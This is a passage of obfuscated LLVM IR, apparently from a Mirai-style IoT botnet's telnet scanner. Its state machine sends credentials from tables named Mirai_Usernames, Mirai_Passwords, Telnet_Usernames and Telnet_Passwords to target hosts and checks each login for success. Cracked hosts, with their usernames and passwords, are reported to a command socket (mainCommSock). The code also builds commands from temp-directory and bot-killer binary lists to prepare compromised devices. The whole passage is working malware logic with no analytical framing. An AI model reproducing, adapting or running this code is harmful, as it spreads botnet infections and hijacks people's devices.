  %293 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %293, align 8
  %294 = load i32, i32* %3, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %295, i64* %296, align 8
  %297 = load i32, i32* %6, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %298
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %299, i32 0, i32 0
  %301 = load i32, i32* %300, align 16
  %302 = sub i32 0, 1
  %303 = sub i32 %301, %302
  %304 = add nsw i32 %301, 1
  %305 = call i32 @select(i32 %303, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %305, i32* %7, align 4
  %306 = load i32, i32* %7, align 4
  %307 = icmp eq i32 %306, 1
  br i1 %307, label %308, label %353

; <label>:308:                                    ; preds = %270
  %309 = call i64 @time(i64* null) #5
  %310 = trunc i64 %309 to i32
  %311 = load i32, i32* %6, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 7
  store i32 %310, i32* %314, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %315 = load i32, i32* %6, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %316
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %317, i32 0, i32 0
  %319 = load i32, i32* %318, align 16
  %320 = bitcast i32* %15 to i8*
  %321 = call i32 @getsockopt(i32 %319, i32 1, i32 4, i8* %320, i32* %14) #5
  %322 = load i32, i32* %15, align 4
  %323 = icmp ne i32 %322, 0
  br i1 %323, label %324, label %328

; <label>:324:                                    ; preds = %308
  %325 = load i32, i32* %6, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %326
  call void @reset_telstate(%struct.telstate_t* %327)
  br label %352

; <label>:328:                                    ; preds = %308
  %329 = load i32, i32* %6, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %330
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %331, i32 0, i32 0
  %333 = load i32, i32* %332, align 16
  %334 = load i32, i32* %6, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %335
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %336, i32 0, i32 0
  %338 = load i32, i32* %337, align 16
  %339 = call i32 (i32, i32, ...) @fcntl(i32 %338, i32 3, i8* null)
  %340 = xor i32 %339, -1
  %341 = xor i32 -2049, -1
  %342 = xor i32 319969830, -1
  %343 = or i32 %340, %341
  %344 = or i32 319969830, %342
  %345 = xor i32 %343, -1
  %346 = and i32 %345, %344
  %347 = and i32 %339, -2049
  %348 = call i32 (i32, i32, ...) @fcntl(i32 %333, i32 4, i32 %346)
  %349 = load i32, i32* %6, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %350
  call void @advance_telstate(%struct.telstate_t* %351, i32 2)
  br label %352

; <label>:352:                                    ; preds = %328, %324
  br label %930

; <label>:353:                                    ; preds = %270
  %354 = load i32, i32* %7, align 4
  %355 = icmp eq i32 %354, -1
  br i1 %355, label %356, label %360

; <label>:356:                                    ; preds = %353
  %357 = load i32, i32* %6, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %358
  call void @reset_telstate(%struct.telstate_t* %359)
  br label %930

; <label>:360:                                    ; preds = %353
  br label %361

; <label>:361:                                    ; preds = %360
  %362 = load i32, i32* %6, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %363
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %364, i32 0, i32 7
  %366 = load i32, i32* %365, align 16
  %367 = sub i32 0, 7
  %368 = sub i32 %366, %367
  %369 = add i32 %366, 7
  %370 = zext i32 %368 to i64
  %371 = call i64 @time(i64* null) #5
  %372 = icmp slt i64 %370, %371
  br i1 %372, label %373, label %377

; <label>:373:                                    ; preds = %361
  %374 = load i32, i32* %6, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %375
  call void @reset_telstate(%struct.telstate_t* %376)
  br label %377

; <label>:377:                                    ; preds = %373, %361
  br label %929

; <label>:378:                                    ; preds = %95
  %379 = load i32, i32* %6, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %380
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %381, i32 0, i32 0
  %383 = load i32, i32* %382, align 16
  %384 = load i32, i32* %3, align 4
  %385 = load i32, i32* %6, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %386
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %387, i32 0, i32 9
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @read_until_response(i32 %383, i32 %384, i8* %389, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %391 = icmp ne i32 %390, 0
  br i1 %391, label %392, label %415

; <label>:392:                                    ; preds = %378
  %393 = call i64 @time(i64* null) #5
  %394 = trunc i64 %393 to i32
  %395 = load i32, i32* %6, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %396
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %397, i32 0, i32 7
  store i32 %394, i32* %398, align 16
  %399 = load i32, i32* %6, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %400
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %401, i32 0, i32 9
  %403 = load i8*, i8** %402, align 8
  %404 = call i32 @contains_fail(i8* %403)
  %405 = icmp ne i32 %404, 0
  br i1 %405, label %406, label %410

; <label>:406:                                    ; preds = %392
  %407 = load i32, i32* %6, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %408
  call void @advance_telstate(%struct.telstate_t* %409, i32 0)
  br label %414

; <label>:410:                                    ; preds = %392
  %411 = load i32, i32* %6, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %412
  call void @advance_telstate(%struct.telstate_t* %413, i32 3)
  br label %414

; <label>:414:                                    ; preds = %410, %406
  br label %930

; <label>:415:                                    ; preds = %378
  %416 = load i32, i32* %6, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 7
  %420 = load i32, i32* %419, align 16
  %421 = sub i32 0, %420
  %422 = sub i32 0, 7
  %423 = add i32 %421, %422
  %424 = sub i32 0, %423
  %425 = add i32 %420, 7
  %426 = zext i32 %424 to i64
  %427 = call i64 @time(i64* null) #5
  %428 = icmp slt i64 %426, %427
  br i1 %428, label %429, label %433

; <label>:429:                                    ; preds = %415
  %430 = load i32, i32* %6, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %431
  call void @reset_telstate(%struct.telstate_t* %432)
  br label %433

; <label>:433:                                    ; preds = %429, %415
  br label %929

; <label>:434:                                    ; preds = %95
  %435 = load i32, i32* %6, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 0
  %439 = load i32, i32* %438, align 16
  %440 = load i32, i32* %6, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 4
  %444 = load i8, i8* %443, align 2
  %445 = zext i8 %444 to i64
  %446 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %445
  %447 = load i8*, i8** %446, align 8
  %448 = load i32, i32* %6, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 4
  %452 = load i8, i8* %451, align 2
  %453 = zext i8 %452 to i64
  %454 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %453
  %455 = load i8*, i8** %454, align 8
  %456 = call i64 @strlen(i8* %455) #9
  %457 = call i64 @send(i32 %439, i8* %447, i64 %456, i32 16384)
  %458 = icmp slt i64 %457, 0
  br i1 %458, label %459, label %463

; <label>:459:                                    ; preds = %434
  %460 = load i32, i32* %6, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %461
  call void @reset_telstate(%struct.telstate_t* %462)
  br label %930

; <label>:463:                                    ; preds = %434
  %464 = load i32, i32* %6, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 0
  %468 = load i32, i32* %467, align 16
  %469 = call i64 @send(i32 %468, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i32 0, i32 0), i64 2, i32 16384)
  %470 = icmp slt i64 %469, 0
  br i1 %470, label %471, label %475

; <label>:471:                                    ; preds = %463
  %472 = load i32, i32* %6, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %473
  call void @reset_telstate(%struct.telstate_t* %474)
  br label %930

; <label>:475:                                    ; preds = %463
  %476 = load i32, i32* %6, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %477
  call void @advance_telstate(%struct.telstate_t* %478, i32 4)
  br label %929

; <label>:479:                                    ; preds = %95
  %480 = load i32, i32* %6, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %481
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %482, i32 0, i32 0
  %484 = load i32, i32* %483, align 16
  %485 = load i32, i32* %3, align 4
  %486 = load i32, i32* %6, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 9
  %490 = load i8*, i8** %489, align 8
  %491 = call i32 @read_until_response(i32 %484, i32 %485, i8* %490, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %492 = icmp ne i32 %491, 0
  br i1 %492, label %493, label %516

; <label>:493:                                    ; preds = %479
  %494 = call i64 @time(i64* null) #5
  %495 = trunc i64 %494 to i32
  %496 = load i32, i32* %6, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 7
  store i32 %495, i32* %499, align 16
  %500 = load i32, i32* %6, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %501
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %502, i32 0, i32 9
  %504 = load i8*, i8** %503, align 8
  %505 = call i32 @contains_fail(i8* %504)
  %506 = icmp ne i32 %505, 0
  br i1 %506, label %507, label %511

; <label>:507:                                    ; preds = %493
  %508 = load i32, i32* %6, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %509
  call void @advance_telstate(%struct.telstate_t* %510, i32 0)
  br label %515

; <label>:511:                                    ; preds = %493
  %512 = load i32, i32* %6, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %513
  call void @advance_telstate(%struct.telstate_t* %514, i32 5)
  br label %515

; <label>:515:                                    ; preds = %511, %507
  br label %930

; <label>:516:                                    ; preds = %479
  %517 = load i32, i32* %6, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 7
  %521 = load i32, i32* %520, align 16
  %522 = add i32 %521, -909322578
  %523 = add i32 %522, 7
  %524 = sub i32 %523, -909322578
  %525 = add i32 %521, 7
  %526 = zext i32 %524 to i64
  %527 = call i64 @time(i64* null) #5
  %528 = icmp slt i64 %526, %527
  br i1 %528, label %529, label %533

; <label>:529:                                    ; preds = %516
  %530 = load i32, i32* %6, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %531
  call void @reset_telstate(%struct.telstate_t* %532)
  br label %533

; <label>:533:                                    ; preds = %529, %516
  br label %929

; <label>:534:                                    ; preds = %95
  %535 = load i32, i32* %6, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 0
  %539 = load i32, i32* %538, align 16
  %540 = load i32, i32* %6, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %541
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %542, i32 0, i32 5
  %544 = load i8, i8* %543, align 1
  %545 = zext i8 %544 to i64
  %546 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %545
  %547 = load i8*, i8** %546, align 8
  %548 = load i32, i32* %6, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 5
  %552 = load i8, i8* %551, align 1
  %553 = zext i8 %552 to i64
  %554 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %553
  %555 = load i8*, i8** %554, align 8
  %556 = call i64 @strlen(i8* %555) #9
  %557 = call i64 @send(i32 %539, i8* %547, i64 %556, i32 16384)
  %558 = icmp slt i64 %557, 0
  br i1 %558, label %559, label %563

; <label>:559:                                    ; preds = %534
  %560 = load i32, i32* %6, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %561
  call void @reset_telstate(%struct.telstate_t* %562)
  br label %930

; <label>:563:                                    ; preds = %534
  %564 = load i32, i32* %6, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 0
  %568 = load i32, i32* %567, align 16
  %569 = call i64 @send(i32 %568, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i32 0, i32 0), i64 2, i32 16384)
  %570 = icmp slt i64 %569, 0
  br i1 %570, label %571, label %575

; <label>:571:                                    ; preds = %563
  %572 = load i32, i32* %6, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %573
  call void @reset_telstate(%struct.telstate_t* %574)
  br label %930

; <label>:575:                                    ; preds = %563
  %576 = load i32, i32* %6, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %577
  call void @advance_telstate(%struct.telstate_t* %578, i32 6)
  br label %929

; <label>:579:                                    ; preds = %95
  %580 = load i32, i32* %6, align 4
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %581
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %582, i32 0, i32 0
  %584 = load i32, i32* %583, align 16
  %585 = load i32, i32* %3, align 4
  %586 = load i32, i32* %6, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 9
  %590 = load i8*, i8** %589, align 8
  %591 = call i32 @read_until_response(i32 %584, i32 %585, i8* %590, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %592 = icmp ne i32 %591, 0
  br i1 %592, label %593, label %664

; <label>:593:                                    ; preds = %579
  %594 = call i64 @time(i64* null) #5
  %595 = trunc i64 %594 to i32
  %596 = load i32, i32* %6, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %597
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %598, i32 0, i32 7
  store i32 %595, i32* %599, align 16
  %600 = load i32, i32* %6, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 9
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @contains_fail(i8* %604)
  %606 = icmp ne i32 %605, 0
  br i1 %606, label %607, label %611

; <label>:607:                                    ; preds = %593
  %608 = load i32, i32* %6, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %609
  call void @advance_telstate(%struct.telstate_t* %610, i32 0)
  br label %663

; <label>:611:                                    ; preds = %593
  %612 = load i32, i32* %6, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %613
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %614, i32 0, i32 9
  %616 = load i8*, i8** %615, align 8
  %617 = call i32 @contains_success(i8* %616)
  %618 = icmp ne i32 %617, 0
  br i1 %618, label %619, label %658

; <label>:619:                                    ; preds = %611
  %620 = load i32, i32* %6, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %621
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %622, i32 0, i32 3
  %624 = load i8, i8* %623, align 1
  %625 = zext i8 %624 to i32
  %626 = icmp eq i32 %625, 2
  br i1 %626, label %627, label %631

; <label>:627:                                    ; preds = %619
  %628 = load i32, i32* %6, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %629
  call void @advance_telstate(%struct.telstate_t* %630, i32 7)
  br label %657

; <label>:631:                                    ; preds = %619
  %632 = load i32, i32* @mainCommSock, align 4
  %633 = load i32, i32* %6, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %634
  %636 = call i8* @get_telstate_host(%struct.telstate_t* %635)
  %637 = load i32, i32* %6, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %638
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %639, i32 0, i32 4
  %641 = load i8, i8* %640, align 2
  %642 = zext i8 %641 to i64
  %643 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %642
  %644 = load i8*, i8** %643, align 8
  %645 = load i32, i32* %6, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 5
  %649 = load i8, i8* %648, align 1
  %650 = zext i8 %649 to i64
  %651 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %650
  %652 = load i8*, i8** %651, align 8
  %653 = call i32 (i32, i8*, ...) @sockprintf(i32 %632, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.488, i32 0, i32 0), i8* %636, i8* %644, i8* %652)
  %654 = load i32, i32* %6, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %655
  call void @advance_telstate(%struct.telstate_t* %656, i32 7)
  br label %657

; <label>:657:                                    ; preds = %631, %627
  br label %662

; <label>:658:                                    ; preds = %611
  %659 = load i32, i32* %6, align 4
  %660 = sext i32 %659 to i64
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %660
  call void @reset_telstate(%struct.telstate_t* %661)
  br label %662

; <label>:662:                                    ; preds = %658, %657
  br label %663

; <label>:663:                                    ; preds = %662, %607
  br label %930

; <label>:664:                                    ; preds = %579
  %665 = load i32, i32* %6, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %666
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %667, i32 0, i32 7
  %669 = load i32, i32* %668, align 16
  %670 = sub i32 0, %669
  %671 = sub i32 0, 7
  %672 = add i32 %670, %671
  %673 = sub i32 0, %672
  %674 = add i32 %669, 7
  %675 = zext i32 %673 to i64
  %676 = call i64 @time(i64* null) #5
  %677 = icmp slt i64 %675, %676
  br i1 %677, label %678, label %682

; <label>:678:                                    ; preds = %664
  %679 = load i32, i32* %6, align 4
  %680 = sext i32 %679 to i64
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %680
  call void @reset_telstate(%struct.telstate_t* %681)
  br label %682

; <label>:682:                                    ; preds = %678, %664
  br label %929

; <label>:683:                                    ; preds = %95
  %684 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %685 = call i32 (i8*, i8*, ...) @sprintf(i8* %684, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.489, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %686 = load i32, i32* %6, align 4
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %687
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %688, i32 0, i32 0
  %690 = load i32, i32* %689, align 16
  %691 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %692 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %693 = call i64 @strlen(i8* %692) #9
  %694 = call i64 @send(i32 %690, i8* %691, i64 %693, i32 16384)
  %695 = icmp slt i64 %694, 0
  br i1 %695, label %696, label %700

; <label>:696:                                    ; preds = %683
  %697 = load i32, i32* %6, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %698
  call void @reset_telstate(%struct.telstate_t* %699)
  br label %930

; <label>:700:                                    ; preds = %683
  call void @RemoveTempDirs()
  %701 = load i32, i32* @mainCommSock, align 4
  %702 = load i32, i32* %6, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %703
  %705 = call i8* @get_telstate_host(%struct.telstate_t* %704)
  %706 = load i32, i32* %6, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %707
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %708, i32 0, i32 4
  %710 = load i8, i8* %709, align 2
  %711 = zext i8 %710 to i64
  %712 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %711
  %713 = load i8*, i8** %712, align 8
  %714 = load i32, i32* %6, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 5
  %718 = load i8, i8* %717, align 1
  %719 = zext i8 %718 to i64
  %720 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %719
  %721 = load i8*, i8** %720, align 8
  %722 = call i32 (i32, i8*, ...) @sockprintf(i32 %701, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.490, i32 0, i32 0), i8* %705, i8* %713, i8* %721)
  %723 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %724 = call i32 (i8*, i8*, ...) @sprintf(i8* %723, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.491, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %725 = load i32, i32* %6, align 4
  %726 = sext i32 %725 to i64
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %726
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %727, i32 0, i32 0
  %729 = load i32, i32* %728, align 16
  %730 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %731 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %732 = call i64 @strlen(i8* %731) #9
  %733 = call i64 @send(i32 %729, i8* %730, i64 %732, i32 16384)
  %734 = icmp slt i64 %733, 0
  br i1 %734, label %735, label %739

; <label>:735:                                    ; preds = %700
  %736 = load i32, i32* %6, align 4
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %737
  call void @reset_telstate(%struct.telstate_t* %738)
  br label %930

; <label>:739:                                    ; preds = %700
  %740 = load i32, i32* @mainCommSock, align 4
  %741 = load i32, i32* %6, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %742
  %744 = call i8* @get_telstate_host(%struct.telstate_t* %743)
  %745 = load i32, i32* %6, align 4
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %746
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %747, i32 0, i32 4
  %749 = load i8, i8* %748, align 2
  %750 = zext i8 %749 to i64
  %751 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %750
  %752 = load i8*, i8** %751, align 8
  %753 = load i32, i32* %6, align 4
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %754
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %755, i32 0, i32 5
  %757 = load i8, i8* %756, align 1
  %758 = zext i8 %757 to i64
  %759 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %758
  %760 = load i8*, i8** %759, align 8
  %761 = call i32 (i32, i8*, ...) @sockprintf(i32 %740, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.492, i32 0, i32 0), i8* %744, i8* %752, i8* %760)
  %762 = load i32, i32* %6, align 4
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %763
  call void @advance_telstate(%struct.telstate_t* %764, i32 8)
  br label %929

; <label>:765:                                    ; preds = %95
  %766 = call i64 @time(i64* null) #5
  %767 = trunc i64 %766 to i32
  %768 = load i32, i32* %6, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %769
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %770, i32 0, i32 7
  store i32 %767, i32* %771, align 16
  %772 = load i32, i32* %6, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %774, i32 0, i32 0
  %776 = load i32, i32* %775, align 16
  %777 = call i64 @send(i32 %776, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.493, i32 0, i32 0), i64 4, i32 16384)
  %778 = icmp slt i64 %777, 0
  br i1 %778, label %779, label %780

; <label>:779:                                    ; preds = %765
  br label %780

; <label>:780:                                    ; preds = %779, %765
  %781 = load i32, i32* %6, align 4
  %782 = sext i32 %781 to i64
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %782
